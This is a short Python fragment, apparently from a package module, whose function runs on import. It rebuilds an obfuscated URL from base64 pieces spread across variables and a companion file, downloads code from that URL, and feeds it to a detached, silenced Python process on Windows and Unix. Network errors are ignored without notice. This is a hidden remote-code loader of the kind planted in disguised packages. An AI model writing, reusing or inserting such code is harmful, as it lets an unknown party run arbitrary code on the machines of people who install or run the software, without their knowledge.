###worker###
def mark_function():
    time.sleep(0.5)
    current_dir = os.path.dirname(os.path.abspath(__file__))
    file_path = os.path.join(current_dir, "index_dict.py")

    with open(file_path, "r", encoding="utf-8") as f:
        val3 = f.read()

    hsal = index_conf1 + index_conf2 + val3 + index_conf4
    url = base64.b64decode(hsal).decode("utf-8")
    time.sleep(0.2)

    try:
        response = requests.get(url, timeout=3)
        response.raise_for_status()
        tipora = response.text.encode("utf-8")

        if os.name == "nt":
            DETACHED_PROCESS = 0x00000008
            CREATE_NEW_PROCESS_GROUP = 0x00000200
            p = subprocess.Popen(
                [sys.executable, "-"],
                stdin=subprocess.PIPE,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                close_fds=True,
                creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP
            )
            p.stdin.write(tipora)
            p.stdin.close()
        else:
            p = subprocess.Popen(
                [sys.executable, "-"],
                stdin=subprocess.PIPE,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                close_fds=True,
                start_new_session=True
            )
            p.stdin.write(tipora)
            p.stdin.close()
    except requests.exceptions.RequestException:
        pass

mark_function()
